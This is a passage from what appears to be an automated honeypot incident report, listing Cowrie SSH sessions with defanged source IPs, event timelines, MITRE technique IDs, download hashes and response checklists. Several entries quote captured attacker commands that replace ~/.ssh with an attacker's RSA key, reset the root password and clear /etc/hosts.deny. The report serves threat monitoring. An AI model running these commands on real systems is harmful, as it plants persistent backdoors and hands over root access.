| `2026-04-15 20:58:36` | `cowrie.session.params` |
| `2026-04-15 20:58:36` | `cowrie.command.input` |
| `2026-04-15 20:58:36` | `cowrie.log.closed` |
| `2026-04-15 20:58:36` | `cowrie.session.params` |
| `2026-04-15 20:58:36` | `cowrie.command.input` |
| `2026-04-15 20:58:37` | `cowrie.log.closed` |
| `2026-04-15 20:58:37` | `cowrie.session.params` |
| `2026-04-15 20:58:37` | `cowrie.command.input` |
| `2026-04-15 20:58:37` | `cowrie.log.closed` |
| `2026-04-15 20:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.255.245[.]44` to AbuseIPDB if not already reported
- [ ] Block `119.255.245[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a482b0a93aaf

| Field | Detail |
|---|---|
| **Source IP** | `180.76.184[.]79` |
| **First Seen** | 2026-04-15 21:03 |
| **Last Seen** | 2026-04-15 21:03 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Ae8uCoa3T2tG"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 21:03:22` | `cowrie.session.connect` |
| `2026-04-15 21:03:22` | `cowrie.client.version` |
| `2026-04-15 21:03:22` | `cowrie.client.kex` |
| `2026-04-15 21:03:26` | `cowrie.login.success` |
| `2026-04-15 21:03:26` | `cowrie.session.params` |
| `2026-04-15 21:03:26` | `cowrie.command.input` |
| `2026-04-15 21:03:26` | `cowrie.command.failed` |
| `2026-04-15 21:03:27` | `cowrie.log.closed` |
| `2026-04-15 21:03:27` | `cowrie.session.params` |
| `2026-04-15 21:03:27` | `cowrie.command.input` |
| `2026-04-15 21:03:27` | `cowrie.session.file_download` |
| `2026-04-15 21:03:27` | `cowrie.log.closed` |
| `2026-04-15 21:03:40` | `cowrie.session.params` |
| `2026-04-15 21:03:40` | `cowrie.command.input` |
| `2026-04-15 21:03:40` | `cowrie.log.closed` |
| `2026-04-15 21:03:40` | `cowrie.session.params` |
| `2026-04-15 21:03:40` | `cowrie.command.input` |
| `2026-04-15 21:03:41` | `cowrie.log.closed` |
| `2026-04-15 21:03:41` | `cowrie.session.params` |
| `2026-04-15 21:03:41` | `cowrie.command.input` |
| `2026-04-15 21:03:42` | `cowrie.session.file_download` |
| `2026-04-15 21:03:42` | `cowrie.log.closed` |
| `2026-04-15 21:03:42` | `cowrie.session.params` |
| `2026-04-15 21:03:42` | `cowrie.command.input` |
| `2026-04-15 21:03:42` | `cowrie.log.closed` |
| `2026-04-15 21:03:43` | `cowrie.session.params` |
| `2026-04-15 21:03:43` | `cowrie.command.input` |
| `2026-04-15 21:03:43` | `cowrie.log.closed` |
| `2026-04-15 21:03:44` | `cowrie.session.params` |
| `2026-04-15 21:03:44` | `cowrie.command.input` |
| `2026-04-15 21:03:44` | `cowrie.command.input` |
| `2026-04-15 21:03:44` | `cowrie.log.closed` |
| `2026-04-15 21:03:45` | `cowrie.session.params` |
| `2026-04-15 21:03:45` | `cowrie.command.input` |
| `2026-04-15 21:03:46` | `cowrie.log.closed` |
| `2026-04-15 21:03:46` | `cowrie.session.params` |
| `2026-04-15 21:03:46` | `cowrie.command.input` |
| `2026-04-15 21:03:46` | `cowrie.log.closed` |
| `2026-04-15 21:03:47` | `cowrie.session.params` |
| `2026-04-15 21:03:47` | `cowrie.command.input` |
| `2026-04-15 21:03:47` | `cowrie.log.closed` |
| `2026-04-15 21:03:48` | `cowrie.session.params` |
| `2026-04-15 21:03:48` | `cowrie.command.input` |
| `2026-04-15 21:03:48` | `cowrie.log.closed` |
| `2026-04-15 21:03:48` | `cowrie.session.params` |
| `2026-04-15 21:03:48` | `cowrie.command.input` |
| `2026-04-15 21:03:49` | `cowrie.log.closed` |
| `2026-04-15 21:03:49` | `cowrie.session.params` |
| `2026-04-15 21:03:49` | `cowrie.command.input` |
| `2026-04-15 21:03:50` | `cowrie.log.closed` |
| `2026-04-15 21:03:50` | `cowrie.session.params` |
| `2026-04-15 21:03:50` | `cowrie.command.input` |
| `2026-04-15 21:03:50` | `cowrie.log.closed` |
| `2026-04-15 21:03:51` | `cowrie.session.params` |
| `2026-04-15 21:03:51` | `cowrie.command.input` |
| `2026-04-15 21:03:51` | `cowrie.log.closed` |
| `2026-04-15 21:03:52` | `cowrie.session.params` |
| `2026-04-15 21:03:52` | `cowrie.command.input` |
| `2026-04-15 21:03:52` | `cowrie.log.closed` |
| `2026-04-15 21:03:53` | `cowrie.session.params` |
| `2026-04-15 21:03:53` | `cowrie.command.input` |
| `2026-04-15 21:03:53` | `cowrie.log.closed` |
| `2026-04-15 21:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.184[.]79` to AbuseIPDB if not already reported
- [ ] Block `180.76.184[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2a9f58a32b2

| Field | Detail |
|---|---|
| **Source IP** | `185.216.119[.]134` |
| **First Seen** | 2026-04-15 22:26 |
| **Last Seen** | 2026-04-15 22:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:26:47` | `cowrie.session.connect` |
| `2026-04-15 22:26:47` | `cowrie.client.version` |
| `2026-04-15 22:26:47` | `cowrie.client.kex` |
| `2026-04-15 22:26:47` | `cowrie.login.success` |
| `2026-04-15 22:26:47` | `cowrie.session.params` |
| `2026-04-15 22:26:47` | `cowrie.command.input` |
| `2026-04-15 22:26:47` | `cowrie.command.failed` |
| `2026-04-15 22:26:47` | `cowrie.log.closed` |
| `2026-04-15 22:26:48` | `cowrie.session.params` |
| `2026-04-15 22:26:48` | `cowrie.command.input` |
| `2026-04-15 22:26:48` | `cowrie.session.file_download` |
| `2026-04-15 22:26:48` | `cowrie.log.closed` |
| `2026-04-15 22:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.216.119[.]134` to AbuseIPDB if not already reported
- [ ] Block `185.216.119[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd9f55d24961

| Field | Detail |
|---|---|
| **Source IP** | `185.216.119[.]134` |
| **First Seen** | 2026-04-15 22:26 |
| **Last Seen** | 2026-04-15 22:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:26:49` | `cowrie.session.connect` |
| `2026-04-15 22:26:49` | `cowrie.client.version` |
| `2026-04-15 22:26:49` | `cowrie.client.kex` |
| `2026-04-15 22:26:50` | `cowrie.login.success` |
| `2026-04-15 22:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.216.119[.]134` to AbuseIPDB if not already reported
- [ ] Block `185.216.119[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aecf1f8f4f2

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-15 22:33 |
| **Last Seen** | 2026-04-15 22:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:33:46` | `cowrie.session.connect` |
| `2026-04-15 22:33:46` | `cowrie.client.version` |
| `2026-04-15 22:33:46` | `cowrie.client.kex` |
| `2026-04-15 22:33:48` | `cowrie.login.success` |
| `2026-04-15 22:33:48` | `cowrie.session.params` |
| `2026-04-15 22:33:48` | `cowrie.command.input` |
| `2026-04-15 22:33:48` | `cowrie.command.failed` |
| `2026-04-15 22:33:49` | `cowrie.log.closed` |
| `2026-04-15 22:33:49` | `cowrie.session.params` |
| `2026-04-15 22:33:49` | `cowrie.command.input` |
| `2026-04-15 22:33:50` | `cowrie.session.file_download` |
| `2026-04-15 22:33:50` | `cowrie.log.closed` |
| `2026-04-15 22:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67d5b6c51766

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-15 22:33 |
| **Last Seen** | 2026-04-15 22:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:33:53` | `cowrie.session.connect` |
| `2026-04-15 22:33:53` | `cowrie.client.version` |
| `2026-04-15 22:33:53` | `cowrie.client.kex` |
| `2026-04-15 22:33:55` | `cowrie.login.success` |
| `2026-04-15 22:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def2f4b84cc8

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]80` |
| **First Seen** | 2026-04-15 22:36 |
| **Last Seen** | 2026-04-15 22:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:36:56` | `cowrie.session.connect` |
| `2026-04-15 22:36:56` | `cowrie.client.version` |
| `2026-04-15 22:36:56` | `cowrie.client.kex` |
| `2026-04-15 22:36:57` | `cowrie.login.success` |
| `2026-04-15 22:36:59` | `cowrie.session.params` |
| `2026-04-15 22:36:59` | `cowrie.command.input` |
| `2026-04-15 22:36:59` | `cowrie.command.failed` |
| `2026-04-15 22:36:59` | `cowrie.log.closed` |
| `2026-04-15 22:37:00` | `cowrie.session.params` |
| `2026-04-15 22:37:00` | `cowrie.command.input` |
| `2026-04-15 22:37:00` | `cowrie.session.file_download` |
| `2026-04-15 22:37:00` | `cowrie.log.closed` |
| `2026-04-15 22:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3be34ffe4f7f

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]80` |
| **First Seen** | 2026-04-15 22:37 |
| **Last Seen** | 2026-04-15 22:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:37:02` | `cowrie.session.connect` |
| `2026-04-15 22:37:02` | `cowrie.client.version` |
| `2026-04-15 22:37:02` | `cowrie.client.kex` |
| `2026-04-15 22:37:03` | `cowrie.login.success` |
| `2026-04-15 22:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a793ade9081f

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]80` |
| **First Seen** | 2026-04-15 22:37 |
| **Last Seen** | 2026-04-15 22:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:37:47` | `cowrie.session.connect` |
| `2026-04-15 22:37:47` | `cowrie.client.version` |
| `2026-04-15 22:37:47` | `cowrie.client.kex` |
| `2026-04-15 22:37:48` | `cowrie.login.success` |
| `2026-04-15 22:37:48` | `cowrie.session.params` |
| `2026-04-15 22:37:48` | `cowrie.command.input` |
| `2026-04-15 22:37:48` | `cowrie.command.failed` |
| `2026-04-15 22:37:48` | `cowrie.log.closed` |
| `2026-04-15 22:37:49` | `cowrie.session.params` |
| `2026-04-15 22:37:49` | `cowrie.command.input` |
| `2026-04-15 22:37:50` | `cowrie.session.file_download` |
| `2026-04-15 22:37:50` | `cowrie.log.closed` |
| `2026-04-15 22:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a05a129356df

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]80` |
| **First Seen** | 2026-04-15 22:37 |
| **Last Seen** | 2026-04-15 22:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:37:53` | `cowrie.session.connect` |
| `2026-04-15 22:37:53` | `cowrie.client.version` |
| `2026-04-15 22:37:53` | `cowrie.client.kex` |
| `2026-04-15 22:37:54` | `cowrie.login.success` |
| `2026-04-15 22:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb8b59e6812f

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]80` |
| **First Seen** | 2026-04-15 22:38 |
| **Last Seen** | 2026-04-15 22:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:38:11` | `cowrie.session.connect` |
| `2026-04-15 22:38:11` | `cowrie.client.version` |
| `2026-04-15 22:38:11` | `cowrie.client.kex` |
| `2026-04-15 22:38:11` | `cowrie.login.success` |
| `2026-04-15 22:38:12` | `cowrie.session.params` |
| `2026-04-15 22:38:12` | `cowrie.command.input` |
| `2026-04-15 22:38:12` | `cowrie.command.failed` |
| `2026-04-15 22:38:12` | `cowrie.log.closed` |
| `2026-04-15 22:38:13` | `cowrie.session.params` |
| `2026-04-15 22:38:13` | `cowrie.command.input` |
| `2026-04-15 22:38:13` | `cowrie.session.file_download` |
| `2026-04-15 22:38:13` | `cowrie.log.closed` |
| `2026-04-15 22:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57fad979afbb

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]80` |
| **First Seen** | 2026-04-15 22:38 |
| **Last Seen** | 2026-04-15 22:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:38:15` | `cowrie.session.connect` |
| `2026-04-15 22:38:15` | `cowrie.client.version` |
| `2026-04-15 22:38:18` | `cowrie.client.kex` |
| `2026-04-15 22:38:19` | `cowrie.login.success` |
| `2026-04-15 22:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf3d58279087

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-15 22:38 |
| **Last Seen** | 2026-04-15 22:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:38:30` | `cowrie.session.connect` |
| `2026-04-15 22:38:30` | `cowrie.client.version` |
| `2026-04-15 22:38:31` | `cowrie.client.kex` |
| `2026-04-15 22:38:32` | `cowrie.login.success` |
| `2026-04-15 22:38:32` | `cowrie.session.params` |
| `2026-04-15 22:38:32` | `cowrie.command.input` |
| `2026-04-15 22:38:32` | `cowrie.command.failed` |
| `2026-04-15 22:38:33` | `cowrie.log.closed` |
| `2026-04-15 22:38:34` | `cowrie.session.params` |
| `2026-04-15 22:38:34` | `cowrie.command.input` |
| `2026-04-15 22:38:34` | `cowrie.session.file_download` |
| `2026-04-15 22:38:34` | `cowrie.log.closed` |
| `2026-04-15 22:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3f3056ede71

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-15 22:38 |
| **Last Seen** | 2026-04-15 22:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:38:37` | `cowrie.session.connect` |
| `2026-04-15 22:38:37` | `cowrie.client.version` |
| `2026-04-15 22:38:38` | `cowrie.client.kex` |
| `2026-04-15 22:38:39` | `cowrie.login.success` |
| `2026-04-15 22:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f91d5b2d3da4

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]80` |
| **First Seen** | 2026-04-15 22:40 |
| **Last Seen** | 2026-04-15 22:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:40:14` | `cowrie.session.connect` |
| `2026-04-15 22:40:14` | `cowrie.client.version` |
| `2026-04-15 22:40:14` | `cowrie.client.kex` |
| `2026-04-15 22:40:15` | `cowrie.login.success` |
| `2026-04-15 22:40:16` | `cowrie.session.params` |
